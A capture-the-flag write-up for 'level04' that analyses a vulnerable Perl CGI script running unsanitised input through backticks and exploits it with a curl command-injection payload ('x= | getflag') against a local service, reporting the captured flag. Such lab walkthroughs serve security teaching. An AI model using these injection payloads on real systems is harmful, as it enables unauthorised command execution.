# level04

- We log as `level04`

- We found two perl scripts, both named `level04.pl` , the first in the `home/user/level04` and the other one in `/var/www/level04`

- The content of both file is identical:
```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
	$y = $_[0];
	print `echo $y 2>&1`;
}
x(param("x"));
```
- The permissions are different for each files:

	`home/user/level04/level04.pl:`
	>`-rwsr-sr-x 1 flag04 level04 152 Mar 5 2016 level04.pl`

	`var/www/level04.pl:`
	>`-r-xr-x---+ 1 flag04 level04 152 Aug 17 22:43 level04.pl`

- The seconf file has extended permissions:
```
# file: level04.pl
# owner: flag04
# group: level04
user::r-x
group::r-x
group:www-data:r-x
mask::r-x
other::---
```

- With all those elements we can conclude that:
	- `#!/usr/bin/perl` - This script is written in perl
	- `use CGI qw{param};` - It is a CGI
	- `group:www-data:r-x` - It is used by a web service
	- `# localhost:4747` - The service is running on port `4747`
	- `$y = $_[0];` - The script takes a single parameter
	- `x(param("x"));` - The parameter is named `x`
	- `print 'echo $y 2>&1';` - The parameter is run through `echo` without any parsing

- This means the parameter of this CGI is probably vulnerable to command injection

- We try executing the CGI using `curl -X POST -d "x= $PWD" http://localhost:4747`

- We can read `/var/www/level04` the `PWD` environment variable was successfully passed to `echo`

- We try injecting the `getflag` command using a pipe: `curl -X POST -d "x= | getflag" http://localhost:4747`

- We get the flag: `ne2searoevaevoem4ov4ar8ap`
